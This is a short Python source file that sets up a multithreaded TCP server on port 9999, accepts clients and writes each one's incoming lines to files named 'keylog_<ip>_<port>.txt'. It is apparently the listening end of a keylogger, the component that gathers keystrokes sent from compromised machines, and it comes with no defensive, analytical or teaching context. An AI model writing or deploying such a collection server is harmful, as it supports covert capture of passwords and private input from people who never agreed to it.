import socket
import threading

# Set up the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "0.0.0.0"  # Listen on all interfaces
port = 9999       # Port to listen on
server_socket.bind((host, port))
server_socket.listen()

print(f"Server listening on {host}:{port}")

def handle_client(client_socket, addr):
    """Handle communication with a single client."""
    print(f"Connected to {addr}")
    # Create a unique log file for each client
    log_file = f"keylog_{addr[0]}_{addr[1]}.txt"
    buffer = ""
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:  # Client disconnected
                break
            buffer += data
            while "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                print(f"Received from {addr}: {line}")
                with open(log_file, "a") as f:
                    f.write(line + "\n")
        except Exception as e:
            print(f"Error with client {addr}: {e}")
            break
    client_socket.close()
    print(f"Connection closed with {addr}")

# Continuously accept new connections
while True:
    client_socket, addr = server_socket.accept()
    # Create a new thread for each client
    client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
    client_thread.start()